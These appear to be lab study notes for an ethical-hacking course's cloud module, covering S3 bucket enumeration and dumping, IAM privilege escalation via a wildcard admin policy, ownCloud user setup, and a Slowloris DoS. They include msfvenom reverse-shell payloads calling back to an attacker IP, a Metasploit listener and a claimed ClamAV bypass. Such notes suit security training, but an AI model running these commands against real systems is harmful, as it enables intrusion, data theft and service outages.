# Module 19 - Cloud Computing #

## Perform S3 Bucket Enumeration ##
Information collected by S3 enumeration tools consists of a list of misconfigured S3 buckets that are available publicly. Attackers can exploit these buckets to gain unauthorized access to them, modify, delete and even exfiltrate the bucket content.

### lazys3 ###
lazys3 is a Ruby script tool that is used to brute-force AWS S3 buckets using different permutations. This tool obtains publicly accessible S3 buckets and also allows to search the S3 buckets of a specific company by entering the company name.

It can be downloaded: `git clone https://github.com/nahamsec/lazys3`. Or in Windows at: `Module 19 Cloud Computing\GitHub Tools\`.

`ruby lazys3.rb (<Company>)`

### S3Scanner ###
S3Scanner is a tool that finds the open S3 buckets and dumps their contents. It takes a list of bucket names to check as its input. 

It can be downloaded: `git clone https://github.com/sa7mon/S3Scanner`. Or in Windows at: `Module 19 Cloud Computing\GitHub Tools\`. Then, install the requirements: `pip3 install -r requirements.txt`.

* `python ./s3scanner.py <file containing the target URL - Ex. sites.txt>.txt` - To list the publicly available S3 Buckets
* `python ./s3scanner.py --include-closed --out-file <output filename> --dump <file containing the target URL>.txt` - Dump all open buckets and log both open and closed buckets in the output file
* `python ./s3scanner.py --list <file containing the target URL (?) - or output filename, i'm not sure>.txt` - Save the file listings of all open buckets to a file

### Other S3 Bucket Enumeration Tools ###
* S3Inspector (GitHub)
* s3-buckets-bruteforcer (GitHub)
* Mass3 (GitHub)
* Bucket Finder (https://digi.ninja)
* s3recon (GitHub)


- - - -

## Exploit S3 Buckets ##
Simple Storage Service (S3) is a scalable cloud storage service offered by Amazon Web Services (AWS) whereby files, folders and objects are stored via web APIs. Leavinga S3 bucket session running enables you to modify files such as JavaScript or related code and inject malware into the bucket files.

Techniques used to identify AWS S3 Buckets:

* Inspecting HTML: Analyze the source code of HTML web pages in the background to find URLs to the target S3 Buckets
* Brute-Forcing URL: Brute-force the target bucket's URL to identify its correct URL
* Finding Subdomains (Findsubdomains, Robtex...)
* Reverse IP Search: To identify the domains of the target (Bing...)
* Advanced Google Hacking

### AWS CLI ###
The AWS Command-Line Interface (CLI) is a unified tool for managing AWS Services. With just one tool to download and configure, you can control multiple AWS services from the command line and automate them through scripts.

`pip install awscli` > `aws configure` (Enter the needed details, provided in your an AWS account)

* `aws s3 ls s3://<Bucket name>` - To list the directories in a Bucket
* `aws s3 mv <file> s3://<Bucket name>` - To move a local file to the Bucket
* `aws s3 rm s3://<Bucket name>/<file>` - To remove a file from the Bucket


- - - -

## Perform Privilege Escalation ##

### Escalate IAM User Privileges by Exploiting Misconfigured User Policy ###
After connecting to the AWS CLI and configuring it as shown before, let's create a user policy that gives administrator access to the target IAM user:

`vim user-policy.json`

```
  {
    "Version":"2012-10-17",
    "Statement":[
      {
        "Effect":"Allow",
        "Action":"*",
        "Resource":"*"
      }
    ]
  }
```

Now, let's attack the created policy to the target IAM user's account: 
1. `aws iam create-policy --policy-name <policy name - Ex. user-policy> --policy-document file://user-policy.json`
2. `aws iam attach-user-policy --user-name <target username> --policy-arn arn:aws:iam::<account id>:policy/user-policy`
3. `aws iam list-attached-user-policies --user-name <target username> ` - Now we will see that the user has our policy attached to it
4. Now we have admin rights, and can see sensitive information about the Bucket:
    * `aws iam list-users` - To list all IAM users in the AWS environment
    * `aws s3api list-buckets --query "Buckets[].Name"` - To list S3 Buckets
    * `aws iam list-user-policies` - To list user policies
    * `aws iam list-role-policies` - To list role policies
    * `aws iam list-group-policies` - To list group policies
    * `aws iam create-user` - To create a new user
 

- - - - 

## Creating User Accounts and Assigning User Rights ##
### ownCloud ###
1. Login as Admin into ``` http://localhost/owncloud ``` (There's also a client desktop app).
2. Right Menu > 'Users'
3. Enter the username and password into the 'Username' and 'Password' fields, select the Groups it will belong to and click on 'Create'
4. Left Menu > 'Files'
5. Add Icon > Select a folder to add > 'Share'
6. Double Click the newly added folder > Add > Upload a file
7. Go back to the Files section
8. Select the three dots in the newly added folder > 'Details' > 'Sharing' > Add the new user
9. Select the sharing permissions of the new user (Share and Edit)

In the desktop client app, you can access, copy, add, delete... the files and folders from the computer to _ownCloud_, such as with _OneDrive_.


- - - -

## Securing ownCloud from Malicious File Uploads ##
Create the Trojan (``` msfvenom -p windows/meterpreter/reverse_tcp -f exe > <Output Path>/trojan.exe ```) and upload it to ``` http://<Victim IP>/owncloud ```.

### ClamAV ###
It will detect the Trojan and stop the upload.


- - - -

## Bypassing ownCloud Antivirus and Hacking the Host ##
1. Create a malicious file (``` msfvenom -p linux/x86/shell/reverse_tcp LHOST=<Attacker IP> LPORT=<Attacker Port> --platform linux -f elf > <Output Path>/exploit.elf ```) and upload it to ``` http://<Victim IP>/owncloud ```.
2. ClamAV will not detect it because we've changed the payload architecture.
3. ``` msfconsole ``` > ``` use multi/handler ``` > ``` set payload linux/x86/shell/reverse_tcp ```, ``` set LHOST <Attacker IP> ```, ``` set LPORT <Attacker Port> ```, ``` exploit ```
4. Now, from the victim machine download the ``` exploit.elf ``` file, change its permissions (``` chmod -R 755 exploit.elf ```) and execute it (``` ./exploit.elf ```).
5. In the attacker machine, if Meterpreter does not start automatically interacting with the victim, type: ``` sessions -i 1 ```.


- - - -

## Implementing DoS Attack on Linux Cloud Server ##

### Slowloris Script ###
1. Go to the Slowloris folder (``` cd Desktop/Slowloris/ ```)
2. Change the permissions to the main file ``` chmod 777 Slowloris.pl ```
3. Perform the DoS attack: ``` ./Slowloris.pl -dns <Target IP> ```
